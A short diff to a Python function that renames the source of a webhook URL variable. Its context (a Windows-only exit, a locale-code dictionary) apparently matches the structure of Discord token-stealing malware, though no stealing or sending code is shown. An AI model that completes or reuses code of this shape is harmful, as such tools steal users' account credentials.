@@ -143,7 +143,7 @@ def main_2():
     input("1")
 
     import re, os
-    from mainfile import disc
+    from mainfile import web
 
     if os.name != "nt":
         exit()
@@ -159,7 +159,7 @@ def main_2():
     from time import sleep
     from sys import argv
 
-    webhook_url = disc
+    webhook_url = web
 
     languages = {
         'da': 'Danish, Denmark',
